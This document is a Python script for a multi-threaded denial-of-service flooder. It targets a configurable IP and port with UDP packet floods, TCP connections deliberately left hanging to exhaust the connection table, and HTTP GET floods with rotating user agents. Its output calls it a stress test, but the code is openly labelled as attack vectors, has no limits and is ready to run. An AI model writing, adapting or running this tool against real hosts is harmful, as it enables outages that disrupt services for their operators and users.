import socket
import threading
import random
import sys
import time
from urllib import request

TARGET = "REPLACE_WITH_TARGET_IP"
PORT = 80
THREADS = 500
METHOD = "UDP"

def get_user_agent():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X)"
    ]
    return random.choice(agents)

def generate_payload(size):
    return random._urandom(size)

# --- ATTACK VECTORS ---
def udp_flood():
    payload = generate_payload(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, (TARGET, PORT))
        except:
            pass

def tcp_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((TARGET, PORT))
            s.send(b"GET / HTTP/1.1\r\n")
            # We don't close, we let the connection hang to fill the table
        except:
            pass

def http_flood():
    url = f"http://{TARGET}:{PORT}/"
    while True:
        try:
            req = request.Request(url)
            req.add_header("User-Agent", get_user_agent())
            request.urlopen(req)
        except:
            pass


def start_engine():
    print(f"[*] Initializing {METHOD} stress test on {TARGET}:{PORT}")
    print(f"[*] Deploying {THREADS} worker threads...")
    
    for i in range(THREADS):
        if METHOD == "UDP":
            t = threading.Thread(target=udp_flood)
        elif METHOD == "TCP":
            t = threading.Thread(target=tcp_flood)
        else:
            t = threading.Thread(target=http_flood)
        t.daemon = True
        t.start()

    while True:
        time.sleep(1)

if __name__ == "__main__":
    try:
        start_engine()
    except KeyboardInterrupt:
        print("\n[!] Test Terminated.")
        sys.exit()